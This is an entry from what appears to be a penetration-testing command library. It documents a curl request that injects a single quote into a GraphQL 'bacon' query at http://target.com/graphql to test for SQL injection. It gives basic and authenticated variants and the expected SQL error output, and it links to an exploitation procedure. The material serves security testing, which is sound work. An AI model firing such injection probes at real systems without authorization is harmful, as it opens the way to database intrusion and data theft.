---
type: command
executor: bash
data: >-
  { \n    bacon(id: \"1'\") { \n        id, \n        type, \n        price\n   
  }\n}
output: null
platforms:
  - Web
tags:
  - graphql
  - sql-injection
verified: true
validated: true
---

# graphql-query-bacon-by-id-with-injection

## Command

```bash
curl -X POST -H "Content-Type: application/graphql" -d '{ 
    bacon(id: "1'") { 
        id, 
        type, 
        price
    }
}' http://target.com/graphql
```

## Description

This command sends a GraphQL query to fetch 'bacon' data by ID, injecting a single quote to test for SQL injection. It targets vulnerable resolvers that concatenate inputs directly into SQL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `id: "1'"` | Injected ID value with single quote to break SQL string | Yes |
| `http://target.com/graphql` | GraphQL endpoint URL | Yes |
| `-H "Content-Type: application/graphql"` | Sets header for GraphQL request | Yes |
| `-X POST` | HTTP method for query submission | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/graphql" -d '{ bacon(id: "1'") { id, type, price } }' http://target.com/graphql
```

### Advanced Usage

Add authentication if required:

```bash
curl -X POST -H "Content-Type: application/graphql" -H "Authorization: Bearer token" -d '{ bacon(id: "1'") { id, type, price } }' http://target.com/graphql
```

## Expected Output

If vulnerable, returns an SQL error like:

```
{"errors":[{"message":"SQL syntax error near '''"}]}
```

Or partial data if injection partially succeeds.

## Related

- [[procedures/GraphQL-SQL-Injection-Exploitation]]
- [[commands/curl-graphql-time-based-sql-injection]]
